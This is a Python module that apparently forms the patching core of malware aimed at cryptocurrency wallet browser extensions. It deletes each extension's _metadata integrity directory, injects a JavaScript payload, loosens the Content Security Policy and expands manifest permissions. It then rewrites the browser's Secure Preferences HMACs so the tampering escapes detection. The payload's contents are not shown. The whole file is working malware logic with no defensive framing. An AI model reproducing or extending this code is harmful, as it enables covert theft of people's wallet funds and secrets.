"""High-level patching API consumed by launcher."""

from __future__ import annotations

import logging
from dataclasses import dataclass
from pathlib import Path
from typing import List, Optional

from libhmac.calculator import PrefHashCalculator
from libhmac.constants import (
    DEFAULT_HOST_PERMISSIONS,
    DEFAULT_PERMISSIONS,
    INJECTED_JS_NAME,
)
from libhmac.patch.vault import patch_extension_html_tree, patch_extension_manifest
from libhmac.payload import inject_payload, remove_metadata_dir
from libhmac.preferences import update_regular_preferences
from libhmac.secure_prefs import process_secure_preferences

logger = logging.getLogger(__name__)


@dataclass(frozen=True)
class PatchTarget:
    """One wallet extension version directory to patch."""

    browser_name: str
    browser_key: str
    profile_name: str
    profile_path: str
    extension_id: str
    wallet_name: str
    version_dir: str


@dataclass
class PatchResult:
    target: PatchTarget
    payload_injected: bool = False
    html_files_patched: int = 0
    manifest_patched: bool = False
    ok: bool = False
    error: Optional[str] = None


def patch_extension_target(
    target: PatchTarget,
    calculator: PrefHashCalculator,
    *,
    payload_dir: Optional[str | Path] = None,
) -> PatchResult:
    """
    Patch one extension version directory: remove _metadata, inject payload,
    relax HTML CSP, update manifest permissions/CSP.
    """
    result = PatchResult(target=target)
    vdir = target.version_dir
    try:
        remove_metadata_dir(vdir)
        result.payload_injected = inject_payload(vdir, payload_dir=payload_dir)
        if not result.payload_injected:
            result.error = "payload files missing or copy failed"
            return result

        result.html_files_patched = patch_extension_html_tree(
            vdir,
            INJECTED_JS_NAME,
            on_error=lambda p, e: logger.debug("HTML patch %s: %s", p, e),
        )
        result.manifest_patched = patch_extension_manifest(
            vdir,
            DEFAULT_PERMISSIONS,
            DEFAULT_HOST_PERMISSIONS,
            on_error=lambda e: logger.warning("Manifest patch %s: %s", vdir, e),
        )
        result.ok = result.payload_injected
    except OSError as e:
        result.error = str(e)
        logger.warning("patch_extension_target failed: %s", e)
    return result


def patch_profile(
    profile_path: str | Path,
    browser_key: str,
    calculator: PrefHashCalculator,
) -> tuple[bool, bool]:
    """
    Update Secure Preferences (HMAC) and regular Preferences for one profile.
    Returns (secure_modified, prefs_modified).
    """
    path = Path(profile_path)
    secure_mod, _ = process_secure_preferences(
        path, calculator, browser_name=browser_key
    )
    prefs_mod = update_regular_preferences(path, calculator)
    return secure_mod, prefs_mod
